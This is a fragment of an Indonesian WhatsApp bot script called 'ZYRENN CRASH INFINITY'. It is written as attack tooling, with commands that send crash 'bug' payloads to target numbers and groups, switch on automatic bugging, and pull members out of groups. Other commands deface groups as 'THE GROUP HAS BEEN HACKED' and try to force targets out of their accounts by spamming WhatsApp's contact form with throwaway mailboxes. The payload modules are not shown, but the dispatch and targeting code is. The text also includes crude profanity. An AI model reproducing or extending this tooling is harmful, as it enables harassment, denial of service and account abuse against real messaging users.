...
const pek= (teks) => {
zyren.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/PakTzy`}}}, { quoted: kon })
} 
const bal= (teks) => {
...
const bangtzy= (teks) => {
zyren.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/PakTzy`}}}, { quoted: tzy })
} 
// Target
const reply = (teks) => {
...
const anjay = (teks) => {
 zyren.sendMessage(m.chat, { image: kalimage, caption: teks, contextInfo:{"externalAdReply": {"title": `㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/PakTzy`,
...
if (settings) {
if (!('templateImage' in settings)) settings.templateImage = true
...
if (!groupAdm.includes(botNumber)) return SiGroupadmin(from)
setTimeout(() => {
...
bangtzy("Berhasil Menculik Member") 
}

//AUTO BUG REACTION
let regex =[  "〽️",]
for (let i of regex) {
if (m.isGroup && db.data.chats[m.chat].autobugreact && budy.toLowerCase().includes(i)){ 
...
case "slep":
{
zyren.relayMessage(m.chat, { reactionMessage }, { messageId: "AMPUN TUAN XINN🥺🙏" })
await sleep(8000)
zyren.relayMessage(m.chat, { reactionMessage }, { messageId: "AMPUN TUAN XINN🥺🙏" })
}
break
...
if (m.quoted || q)
 {
let cekno = await zyren.onWhatsApp(m.sender)
if (cekno.length == 0) return reply(`Peserta tersebut Sudah Tidak Terdaftar Di WhatsApp`)
if (m.sender === global.owner) return reply(`Tidak Bisa Verif My Creator!`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=938")
...
reply(`Succes..
Target Sudah Ter Log Out Dari Akun Whatsapp!`)
...
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=9999999999999999999999999999999988898788898888884948484894988")
...
zyren.sendMessage(m.chat, { text: util.format(res.data)}, { quoted: m })
...
var { img } = await generateProfilePicture('./basetzy/gambarnye/ked.jpg')
...
await zyren.updateProfilePicture(m.chat, { url: './basetzy/gambarnye/ked.jpg' }) 
await zyren.groupUpdateDescription(m.chat, teks)
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED")
await zyren.updateProfilePicture(m.chat, { url: './basetzy/gambarnye/kud.jpg' }) 
...
case `santed`:
if (!isCreator) return sticOwner(from)
if (!Input) return bangtzy("Reply pesan/Tag orang/Nomer")
if (mentionByReply) {
...
require("./basetzy/santed/santed")(zyren, bangtzy, text, sleep)
}
break
case `santedgc`:
if (!isCreator) return sticOwner(from)
if (!text) return bangtzy("Masukkan Link Group!")
if (text.split("|")[0] && !text.split("|")[1] && !text.split("|")[2]) {
if (!text.split("|")[0].includes("https://chat.whatsapp.com/")) return bangtzy("Itu bukan link group")
require("./basetzy/santed/indexLink")(zyren, m, prefix, command, text)
} else if (text.split("|")[0] && text.split("|")[1] && !text.split("|")[2]) {
require("./basetzy/santed/indexGc")(zyren, m, prefix, command, text)
} else if (text.split("|")[0] && text.split("|")[1] && text.split("|")[2]) {
require("./basetzy/santed/santedGc")(zyren, bangtzy, text, sleep)
}
break
case `sendbug`:
if (!isCreator) return sticOwner(from)
...
require("./basetzy/sendbug/bagian1/sendbug")(zyren, bangtzy, text, sleep, prefix, ngazap, fkontak, notif3, notif4, place)
}
break
case `sendbugv`:
if (!isCreator) return sticOwner(from)
...
require("./basetzy/sendbug/bagian2/sendbug")(zyren, bangtzy, text, sleep, prefix, ngazap, fkontak, notif3, notif4, place)
}
break
case `sendbuggc`:
if (!isCreator) return sticOwner(from)
...
require("./basetzy/sendbug/bagian1/sendbugGc")(zyren, bangtzy, text, sleep, prefix, ngazap, fkontak, notif3, notif4, place)
}
break
case `sendbuggcv`:
if (!isCreator) return sticOwner(from)
...
require("./basetzy/sendbug/bagian2/sendbugGc")(zyren, bangtzy, text, sleep, prefix, ngazap, fkontak, notif3, notif4, place)
}
break
case `bugdelete`:
...
if (!isCreator) return sticOwner(from)
if (!m.isGroup) throw groupon(from)
if (!text) return bangtzy("Link?")
if (!text.includes("https://chat.whatsapp.com/")) return bangtzy("Itu Bukan Link Group Kak")
...
if (!text.split(",")[0]) return bangtzy("pake koma buat pembatas")
db.data.chats[m.chat].culik = {
status: true, 
penculik: m.sender, 
member: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net")
}
bangtzy("Sukses sekarang masukan link gc") 
} else {
if (!text) return bangtzy("Link?")
if (!text.includes("https://chat.whatsapp.com/")) return bangtzy("Itu Bukan Link Group Kak")
let member = participants.map((x) => x.id)
...
await zyren.groupUpdateDescription(m.chat, teks)
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED")
bangtzy("Sukses Meretas Group...")
} catch { bangtzy('Terjadi Error') }
}
break
case `autobug`:
if (!isCreator) return sticOwner(from)
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autobug.status == true) return bangtzy("Sudah aktif")
db.data.settings[botNumber].autobug = {
status: true, 
expired: Date.now() + toMs(timeBug + "m")
}
bangtzy("Sukses Mengaktifkan Auto Bug")
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autobug.status == false) return bangtzy("Sudah off")
db.data.settings[botNumber].autobug = {
status: false, 
expired: 0
}
bangtzy("Sukses Mematikan Auto bug")
} else {
zyren.sendButMessage(m.chat, `MODE AUTO BUG`, footer, [
...
if (!isCreator) return sticOwner(from)
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.chats[m.chat].autobugreact == true) return bangtzy("Sudah aktif")
db.data.chats[m.chat].autobugreact = true
bangtzy("Sukses mengaktifkan auto bug react")
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[m.chat].autobugreact == false) return bangtzy("Sudah off")
db.data.chats[m.chat].autobugreact = false
bangtzy("Sukses mematikan auto bug react")
} else {
zyren.sendButMessage(m.chat, `MODE AUTO BUG REACT`, footer, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
...
bacito(m.chat, `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`, main)
}}
break
//=================================================//
/*BUG WACAP */
...
//=================================================//
 case 'mode': {
if (!isCreator) return sticOwner(from)
asd = `MODE PUBLIC/SELF`
let buttonsMode = [
{buttonId: `${prefix}pb`, buttonText: {displayText: '𝙿𝚄𝙱𝙻𝙸𝙲'}, type: 1},
{buttonId: `${prefix}sf`, buttonText: {displayText: '𝚂𝙴𝙻𝙵'}, type: 1}
]
let buttonMessageVote = {
text: asd,
footer: zyren.user.name,
...
case 'pb': {
if (!isCreator) return
if (db.data.settings[botNumber].public) return bangtzy("Sudah di mode public") 
...
case 'sf': {
if (!isCreator) return
if (!db.data.settings[botNumber].public) return bangtzy("Sudah di mode self") 
...
ntilink.push(from)
repzy('Succes menyalakan antilink di group kontol ini 🔥')
} else if (args[0] === "off") {
if (!AntiLink) return repzy('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
repzy('Succes mematikan antilink di group kontol ini 🔥')
} else {
...
wlcm.push(from)
repzy('Succes menyalakan welcome di group kontol 🔥')
} else if (args[0] === "off") {
if (!welcm) return repzy('Sudah Mati')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
repzy('Succes mematikan welcome di group kontol 🔥')
} else {
repzy('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
...
case 'allmenu': {
if (isBan) throw sticBanLu(from)
repzy(`Hay Kak ${pushname} 👋 Selamat ${salam}

╭──(        𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘        )
║- Sc Private By Ari Offc友
│🎭 Name : ${pushname}
║▬▭▬▭▬▭▬▭▬▭
│🎭 Creator : RafiMaker01
║🎭 Owner : Rafi, Ari, MrX, Khusnul
│🎭 Owner Number : 088294533698
║🎭 Prefix :MULTI Device
│▬▭「 𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘️ 」▭▬
║
│ Chenel : Cari Aja Sendiri 《Bale Bim》Jangan Manja luh Pepek
║
┗━━━━━━━━━━━━━━━━━━⬣
╔─═─═⊱ *「 JOIN GROUP 」* ─═─═⬣
│┏⊱
║⿻ *Group V1!!〽️ : GADA PEPEK*
│⿻ *Group V2!!〽️ : GADA KONTOL*
║┗⊱
┗━━━━━━━━━━━━━━━━━━⬣
┏━━━━━━━━━━━━━━━━━━⬣
║┏⊱
│║- Sc Private By RafiMaker01 友
║┗⊱
┗━━━━━━━━━━━━━━━━━━⬣
